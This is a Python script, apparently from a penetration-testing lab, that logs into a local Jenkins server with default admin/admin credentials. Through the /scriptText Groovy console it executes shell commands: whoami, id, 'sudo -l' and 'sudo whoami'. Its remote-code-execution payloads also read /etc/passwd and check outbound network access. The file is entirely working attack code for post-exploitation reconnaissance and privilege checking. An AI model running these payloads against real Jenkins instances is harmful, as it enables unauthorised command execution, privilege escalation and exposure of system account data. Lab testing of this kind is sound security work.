#!/usr/bin/env python3
"""Test RCE capabilities in Jenkins Lab."""

import requests
requests.packages.urllib3.disable_warnings()

jenkins_url = "http://localhost:8080"
username = "admin"
password = "admin"

print("="*80)
print("TESTING GROOVY RCE CAPABILITIES")
print("="*80)

# Test 1: Basic command execution
print("\n[TEST 1] Execute 'whoami' command")
groovy_script = '''
def proc = "whoami".execute()
proc.waitFor()
println proc.text
'''

r = requests.post(
    f"{jenkins_url}/scriptText",
    data={"script": groovy_script},
    auth=(username, password),
    verify=False,
    timeout=10
)

print(f"Status: {r.status_code}")
print(f"Output: {r.text.strip()}")

# Test 2: Get user ID
print("\n[TEST 2] Execute 'id' command")
groovy_script = '''
def proc = "id".execute()
proc.waitFor()
println proc.text
'''

r = requests.post(
    f"{jenkins_url}/scriptText",
    data={"script": groovy_script},
    auth=(username, password),
    verify=False,
    timeout=10
)

print(f"Status: {r.status_code}")
print(f"Output: {r.text.strip()}")

# Test 3: Check sudo privileges
print("\n[TEST 3] Check sudo privileges")
groovy_script = '''
def proc = "sudo -l".execute()
proc.waitFor()
println proc.text
'''

r = requests.post(
    f"{jenkins_url}/scriptText",
    data={"script": groovy_script},
    auth=(username, password),
    verify=False,
    timeout=10
)

print(f"Status: {r.status_code}")
print(f"Output: {r.text.strip()}")

# Test 4: List files with elevated permissions
print("\n[TEST 4] Test sudo command execution")
groovy_script = '''
def proc = ["sudo", "whoami"].execute()
proc.waitFor()
println proc.text
'''

r = requests.post(
    f"{jenkins_url}/scriptText",
    data={"script": groovy_script},
    auth=(username, password),
    verify=False,
    timeout=10
)

print(f"Status: {r.status_code}")
print(f"Output: {r.text.strip()}")

# Test 5: Read /etc/passwd
print("\n[TEST 5] Read /etc/passwd")
groovy_script = '''
def file = new File("/etc/passwd")
println file.text
'''

r = requests.post(
    f"{jenkins_url}/scriptText",
    data={"script": groovy_script},
    auth=(username, password),
    verify=False,
    timeout=10
)

print(f"Status: {r.status_code}")
print(f"Output (first 200 chars): {r.text.strip()[:200]}")

# Test 6: Network access
print("\n[TEST 6] Test network connectivity")
groovy_script = '''
def proc = "ping -c 2 google.com".execute()
proc.waitFor()
println proc.text
'''

r = requests.post(
    f"{jenkins_url}/scriptText",
    data={"script": groovy_script},
    auth=(username, password),
    verify=False,
    timeout=10
)

print(f"Status: {r.status_code}")
print(f"Output: {r.text.strip()[:200]}")

print("\n" + "="*80)
print("RCE TESTING COMPLETE")
print("="*80)
